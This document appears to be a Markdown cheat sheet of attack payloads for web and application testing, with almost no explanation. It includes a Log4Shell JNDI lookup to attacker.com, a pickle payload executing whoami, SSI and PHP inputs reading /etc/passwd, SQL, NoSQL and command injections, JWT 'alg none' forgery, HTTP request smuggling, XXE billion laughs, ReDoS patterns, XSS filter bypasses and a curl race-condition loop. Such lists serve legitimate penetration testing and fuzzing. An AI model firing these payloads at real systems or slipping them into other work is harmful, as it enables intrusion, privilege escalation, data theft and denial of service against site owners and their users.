# Edge Cases and Special Payloads

## Extremely Long Strings (DoS)

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Deeply Nested Structures

```json
{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":"nested"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
```

```html
<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>deeply nested</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
```

## Special Characters and Encodings

### Zero-Width Characters

```
​﻿‌‍⁠⁡⁢⁣⁤
admin​user (contains zero-width space)
pass‌word (contains zero-width non-joiner)
```

### Unicode Normalization Issues

```
ℱ℩Ⅎ (mathematical alphanumeric symbols that normalize to FI)
⁄ (fraction slash that might normalize to /)
Ⅸ (Roman numeral that might normalize to IX)
```

### Homoglyph Attacks

```
аdmin (Cyrillic 'а' instead of Latin 'a')
раssword (Cyrillic 'р' instead of Latin 'p')
ехаmple.com (Cyrillic 'е', 'х', 'а' instead of Latin)
```

### Right-to-Left Override

```
admin‮nimdа (uses RTL override to appear as "adminadmin")
file‮gpj.exe (appears as "file.gpj" but is actually "file.exe")
```

## Memory Exhaustion

### Regex DoS (ReDoS)

```
(a+)+$
(a|aa)+$
(a|a)*$
(.*a){x} where x > 10
^(a+)+$
([a-zA-Z]+)*$
(a+)+b
```

### Zip Bomb Text

```
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
```

## Control Characters

```
NULL: \x00
Bell: \x07
Backspace: \x08
Tab: \x09
Line Feed: \x0a
Vertical Tab: \x0b
Form Feed: \x0c
Carriage Return: \x0d
Escape: \x1b
Delete: \x7f
```

## Format String Vulnerabilities

```
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
%n%n%n%n%n%n%n%n%n%n
%p%p%p%p%p%p%p%p%p%p
```

## Buffer Overflow Attempts

```
A x 10000
${jndi:ldap://attacker.com/a}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Header Injection

```
Content-Type: text/html\r\nX-Custom-Header: injected\r\n\r\n<html><body>injected</body></html>
User-Agent: Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1\r\nX-Originating-IP: 127.0.0.1
```

## Deserialization Attacks

### Python Pickle

```python
cos\nsystem\n(S'whoami'\ntR.
```

### Java Serialization

```
aced0005737200116a6176612e7574696c2e48617368536574
```

### PHP Serialization

```php
O:8:"stdClass":1:{s:4:"file";s:18:"/etc/passwd";}
a:1:{i:0;O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}}
```

## Type Juggling (PHP)

```
"0e123456789" == "0e987654321" (both treated as 0)
"0" == false
"1" == true
[] == false
"123abc" == 123
```

## Boolean-Based Blind Injection

```sql
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
' AND BENCHMARK(10000000,MD5('A'))--
```

## IDOR (Insecure Direct Object Reference)

```
/api/user/1
/api/user/../../admin
/api/user/%2e%2e%2fadmin
/api/user/1/../2
```

## Mass Assignment

```json
{"username": "user", "password": "pass", "isAdmin": true, "role": "admin"}
{"email": "test@test.com", "verified": true, "credits": 999999}
```

## Race Conditions

```bash
# Create multiple simultaneous requests
for i in {1..1000}; do curl -X POST http://target.com/transfer & done
```

## Server-Side Include (SSI) Injection

```html
<!--#exec cmd="cat /etc/passwd"-->
<!--#include virtual="/etc/passwd"-->
<!--#echo var="DATE_LOCAL"-->
<!--#config errmsg="[Error]"-->
```

## XSLT Injection

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('user.dir')"/>
  </xsl:template>
</xsl:stylesheet>
```

## Expression Language Injection (EL)

```
${applicationScope}
${sessionScope}
${requestScope}
${param.x}
${header.x}
${cookie.x}
${pageContext.request.contextPath}
${facesContext.externalContext.sessionMap}
```

## GraphQL Injection

```graphql
{
  users(limit: 999999) {
    id
    username
    password
    email
    ssn
    creditCard
  }
}

mutation {
  updateUser(id: "1", role: "admin") {
    id
    role
  }
}
```

## JWT Manipulation

```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "admin",
  "role": "administrator",
  "exp": 9999999999
}
```

## Insecure Randomness

```
seed=1234567890
random=0.123456789
token=predictable_token_12345
```

## Email Header Injection

```
to=victim@example.com%0ACc:attacker@example.com
subject=Test%0ABcc:attacker@example.com
from=user@example.com%0AContent-Type: text/html%0A%0A<script>alert('XSS')</script>
```

## NoSQL Operator Injection

```json
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{"username": {"$regex": ".*"}}
{"username": {"$where": "sleep(1000)"}}
{"username": {"$nin": []}}
```

## XML Billion Laughs

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Time-Based Payloads

```sql
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
```

```bash
& ping -c 10 127.0.0.1 &
| sleep 10 #
```

## HTTP Smuggling

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

## Unicode Bypass

```
<script\u003e>alert('XSS')</script>
\u003cscript\u003ealert('XSS')\u003c/script\u003e
%u003cscript%u003ealert('XSS')%u003c/script%u003e
```

